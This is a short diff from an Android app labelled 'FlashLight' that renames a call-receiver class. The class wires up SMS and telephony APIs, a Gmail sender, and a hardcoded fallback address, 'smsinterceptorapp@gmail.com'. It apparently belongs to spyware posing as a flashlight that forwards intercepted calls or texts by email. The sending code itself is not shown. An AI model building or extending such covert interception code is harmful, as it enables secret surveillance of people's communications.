@@ -12,15 +12,15 @@ import android.telephony.SmsMessage;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 
-public class CallListener extends PhoneCallReceiver {
+public class CallReceiver extends PhoneCallReceiver {
 
   private static GmailSender sender;
   private static Configure configure;
   private static String gmailEmailString;
 
-  private static final String TAG = "FlashLight CallListener";
+  private static final String TAG = "FlashLight CallReceiver";
 
-  public CallListener() { 
+  public CallReceiver() { 
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) { 
       gmailEmailString = String.valueOf(configure.getEmailAddress());
@@ -28,7 +28,7 @@ public class CallListener extends PhoneCallReceiver {
     else {
       gmailEmailString = "smsinterceptorapp@gmail.com"; 
     }
-    Log.i(TAG, "CallListener() constructor gmailEmailString: " + gmailEmailString);
+    Log.i(TAG, "CallReceiver() constructor gmailEmailString: " + gmailEmailString);
   }
 
   @Override
